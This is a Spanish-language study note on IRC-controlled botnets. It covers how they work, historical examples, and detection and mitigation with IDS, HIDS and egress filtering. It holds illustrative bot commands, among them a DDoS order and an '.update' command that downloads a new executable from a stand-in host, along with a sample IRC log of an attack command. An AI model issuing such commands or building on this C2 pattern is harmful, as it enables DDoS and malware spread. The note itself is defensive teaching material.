---
title: "Botnets Controladas Por Irc"
date: 2026-01-26
tags:
  - ciberseguridad
  - redes-protocolos
  - vulnerabilidades-y-amenazas
---
### Botnets controladas por IRC – Nota expandida


> **Relacionado**: [[01-Ciberseguridad/Herramientas/IDOR|IDOR]]. [[01-Ciberseguridad/Herramientas/IDS-IPS/SNORT|SNORT]]. [[01-Ciberseguridad/Herramientas/IDS-IPS/suricata|suricata]]. [[02-Ciencias-Computacion/Redes/Herramientas|Herramientas]]. [[Introduccion-a-la-Criptografiaseguridad|12 Introduccion a la Criptografiaseguridad]].

Una **botnet controlada por IRC** es una red de máquinas comprometidas (bots o zombies) que **reciben instrucciones a través de un canal de chat IRC (Internet Relay Chat)**. Aunque IRC es una tecnología antigua, **sigue siendo usada por su simplicidad, anonimato y flexibilidad**, especialmente en **ataques automatizados, campañas de spam, DDoS o propagación de malware**.

---

###  ¿Qué es una botnet?

Una **botnet** es un conjunto de dispositivos infectados que:

- Se comunican con un **servidor de mando y control (C&C o C2)**.
    
- Ejecutan **órdenes del atacante**, como escanear, enviar spam, minar criptomonedas o lanzar ataques DDoS.
    
- Pueden estar formadas por PCs, servidores, routers, IoT, etc.
    

---

###  ¿Por qué IRC?

IRC es ideal para controlar botnets por varias razones:

- **Fácil de implementar y scriptar** (basado en texto plano).
    
- **Protocolo abierto y persistente**, con soporte para canales, mensajes privados y operadores.
    
- **Difícil de bloquear en redes antiguas**, ya que usa puertos comunes (6667/tcp).
    
- **Puede ofuscarse**: el atacante puede usar servidores públicos, proxies, o crear su propio servidor IRC clandestino.
    

---

### ️ Cómo funciona una botnet IRC

1. El malware se instala en el sistema víctima y contiene un cliente IRC oculto.
    
2. Este cliente **se conecta automáticamente a un canal IRC específico**.
    
3. El atacante (C&C) entra al canal como operador (`@admin`) y envía comandos como:
    
    - `.scan` → escanear nuevas víctimas.
        
    - `.ddos 1.2.3.4 80` → iniciar ataque DDoS.
        
    - `.update http://x.com/new_bot.exe` → descargar nueva versión.
        
4. Cada bot lee el canal y **ejecuta el comando recibido**.
    

---

###  Ejemplo de comunicación IRC botnet (texto real)

```text
:bot123!~user@infected.host JOIN #control
@admin: .ddos 192.168.1.10 80
:bot123 PRIVMSG #control :[+] Attack started on 192.168.1.10:80
```

> El bot entra al canal `#control`, escucha comandos, y responde como si fuera un usuario más.

---

###  Ejemplos reales de botnets IRC

|Nombre|Características|
|---|---|
|**Agobot/Phatbot**|Muy modular, con control por IRC. Soporte para DDoS, keylogging, escaneos.|
|**Sdbot/Rbot**|Basado en Windows, propagación por compartición SMB. Muy común en los 2000.|
|**GTBot (mIRC)**|Usaba scripts de mIRC para actuar como bot en canales. Muy básico.|
|**Kaiten**|Usado en routers Linux. DDoS simple con IRC como C2.|

---

###  Riesgos asociados

- **Control remoto total** del dispositivo.
    
- Pueden descargar y ejecutar cualquier malware adicional.
    
- Usadas en campañas de spam, robo de información, minería, ransomware.
    
- Muchas veces **actúan en silencio durante años**, sin que el usuario lo note.
    
- Si se detecta una, probablemente haya cientos de bots conectados al mismo canal.
    

---

### ️ Detección y mitigación

####  A nivel de red:

- **Monitorear tráfico hacia puertos 6660–7000** (puertos IRC típicos).
    
- Detectar conexiones salientes a servidores IRC desconocidos.
    
- Usar IDS como **Snort o Suricata** con reglas para IRC bots.
    

####  A nivel del host:

- Escanear con antivirus o herramientas de análisis de comportamiento.
    
- Revisar procesos que inician conexiones de red sospechosas (`netstat`, `lsof`, `Wireshark`).
    
- Usar **HIDS** como OSSEC, Wazuh.
    

####  Prevención:

- Mantener actualizado el sistema.
    
- Desactivar scripting o interpretes no usados (como mIRC en entornos Windows).
    
- Cortar conexiones salientes a servidores IRC si no son necesarias.
    
- Usar **Egress filtering** en firewalls para bloquear tráfico saliente no autorizado.
    

---

###  Evolución: del IRC al HTTP y más allá

Aunque IRC fue el estándar clásico, hoy muchas botnets:

- Usan **HTTP/HTTPS (C2 encubierto como tráfico web)**.
    
- Usan **Telegram, Discord o incluso Twitter como C2**.
    
- Integran protocolos P2P (Storm botnet) o cifrado extremo a extremo.
    

> Sin embargo, **las IRC botnets aún existen**, sobre todo en entornos legacy, routers mal protegidos y malware simple de distribución masiva.

---

### Conclusión

Las **botnets controladas por IRC** fueron una de las formas más comunes de malware coordinado y **aún son funcionales por su simplicidad, persistencia y anonimato**. Entender su funcionamiento ayuda a detectar actividad anómala en redes, analizar tráfico sospechoso y **fortalecer medidas de monitoreo y filtrado** en entornos empresariales y personales.

---